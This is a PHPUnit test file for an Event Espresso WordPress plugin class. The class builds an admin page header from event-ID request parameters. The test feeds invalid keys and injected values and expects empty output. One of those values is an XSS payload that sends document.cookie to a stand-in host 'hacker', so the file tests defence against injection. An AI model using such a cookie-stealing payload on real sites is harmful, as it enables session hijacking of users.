<?php

namespace EventEspresso\tests\testcases\core\domain\services\admin\registrations\list_table\page_header;

use EE_Error;
use EE_Event;
use EEM_Event;
use EventEspresso\core\domain\services\admin\registrations\list_table\page_header\EventFilterHeader;
use EventEspresso\core\exceptions\InvalidDataTypeException;
use EventEspresso\core\exceptions\InvalidInterfaceException;
use EventEspresso\tests\mocks\core\services\request\RequestMock;
use InvalidArgumentException;
use PHPUnit\Framework\Exception;
use PHPUnit\Framework\TestCase;
use ReflectionException;

/**
 * @group AdminPageHeaderDecoratorTests
 */
class EventFilterHeaderTest extends TestCase
{

    /**
     * @var EE_Event $event
     */
    protected $event;

    /**
     * @var string $xss
     */
    private $xss = '"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>';


    public static function setUpBeforeClass()
    {
        require_once EE_ADMIN . 'EE_Admin_Page.core.php';
        if (! defined('EVENTS_ADMIN_URL')) {
            define('EVENTS_ADMIN_URL', admin_url('admin.php?page=espresso_events'));
        }
    }


    /**
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @throws Exception
     * @throws InvalidArgumentException
     * @since $VID:$
     */
    public function setUpEvent()
    {
        $this->event = EE_Event::new_instance([
            'EVT_name'      => 'Stephen Hawking’s Time Traveler Party',
        ]);
        $saved = $this->event->save();
        $this->assertTrue($saved > 0);
    }


    /**
     * @param array $get_params
     * @return EventFilterHeader
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidArgumentException
     * @since $VID:$
     */
    private function getEventFilterHeader(array $get_params)
    {
        return new EventFilterHeader(
            new RequestMock($get_params, [], [], [], []),
            EEM_Event::instance()
        );
    }


    /**
     * returns following parameters:
     *      $get_params array of simulated $_GET params
     *      $expected   value of $header_text
     *
     * @return array
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @throws Exception
     * @since  $VID:$
     */
    public function testDataProvider()
    {
        $this->setUpEvent();
        return [
            // empty array
            [[], ''],
            // invalid keys
            [['EVT-ID' => $this->event->ID()], ''],
            [['event-id' => $this->event->ID()], ''],
            // invalid values
            [['EVT_ID' => '<h1>I am from the Future!!!</h1>'], ''],
            [['EVT_ID' => $this->xss], ''],
            [['event_id' => '<h1>I am from the Future!!!</h1>'], ''],
            [['event_id' => $this->xss], ''],
            // all good
            [
                ['EVT_ID' => $this->event->ID()],
                '<h3 style="line-height:1.5em;"> Viewing registrations for the event: &nbsp;<a href="http://https://src.wordpress-develop.test/wp-admin/admin.php?page=espresso_events&action=edit&post=9&edit_nonce=">Stephen Hawking’s Time Traveler Party</a>&nbsp;</h3>'
            ],
            [
                ['event_id' => $this->event->ID()],
                '<h3 style="line-height:1.5em;"> Viewing registrations for the event: &nbsp;<a href="http://https://src.wordpress-develop.test/wp-admin/admin.php?page=espresso_events&action=edit&post=9&edit_nonce=">Stephen Hawking’s Time Traveler Party</a>&nbsp;</h3>'
            ],
        ];
    }


    /**
     * @dataProvider testDataProvider
     * @param array  $get_params
     * @param string $expected
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws EE_Error
     * @throws ReflectionException
     * @since        $VID:$
     */
    public function testGetHeaderText(array $get_params, $expected)
    {
        $event_filter_header = $this->getEventFilterHeader($get_params);
        $header_text = $event_filter_header->getHeaderText();
        // strip out nonce since it constantly changes
        $header_text = preg_replace('/&edit_nonce=\S+"/', '&edit_nonce="', $header_text);
        $this->assertEquals($expected, $header_text);
    }
}
